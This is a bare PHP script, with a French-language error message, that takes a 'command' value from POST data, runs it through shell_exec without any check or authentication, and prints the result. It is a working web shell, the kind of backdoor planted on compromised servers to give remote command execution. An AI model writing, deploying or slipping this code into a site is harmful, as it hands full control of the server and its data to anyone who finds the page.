<?php
if (isset($_POST["command"])) {
    $command = $_POST["command"];
    $output = shell_exec($command);
    if (empty($output)) {
        echo "La commande n'a pas été trouvée ou n'a pas pu être exécutée.";
    } else {
        echo $output;
    }
    exit();
}
?>